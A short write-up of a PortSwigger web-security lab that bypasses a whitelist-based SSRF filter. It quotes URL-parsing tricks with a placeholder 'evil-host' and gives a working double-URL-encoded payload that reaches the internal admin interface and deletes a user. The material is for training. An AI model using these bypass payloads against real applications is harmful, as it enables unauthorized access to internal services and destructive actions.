# [Lab: SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)

## Lab

This lab has a stock check feature which fetches data from an internal system

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed an anti-SSRF defense you will need to bypass.

## bypass whitelist-based

Some applications only allow input that matches, begins with, or contains, a whitelist of permitted values. In this situation, you can sometimes circumvent the filter by exploiting inconsistencies in URL parsing.

The URL specification contains a number of features that are liable to be overlooked when implementing ad hoc parsing and validation of URLs:

- You can embed credentials in a URL before the hostname, using the @ character. For example: `https://expected-host@evil-host`
- You can use the `#` character to indicate a URL fragment. For example: `https://evil-host#expected-host`
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: `https://expected-host.evil-host`
- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.

You can use combinations of these techniques together.

## Solution

Tried:

- `stockApi=http://stock.weliketoshop.net@localhost/admin` -> Failed
- `stockApi=http://localhost/admin#stock.weliketoshop.net` -> Failed

Double encoding -> success:

```http
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

it's work because:

- filter decodes 1 time:

  ```http
  http://localhost:80%23@stock.weliketoshop.net/admin/delete?username=carlos
  ```

  - so the domain here is still `stock.weliketoshop.net`
- backend decodes 2 times:

  ```http
  http://localhost:80#@stock.weliketoshop.net/admin/delete?username=carlos
  ```

  - now the domain is localhost. => bypassed
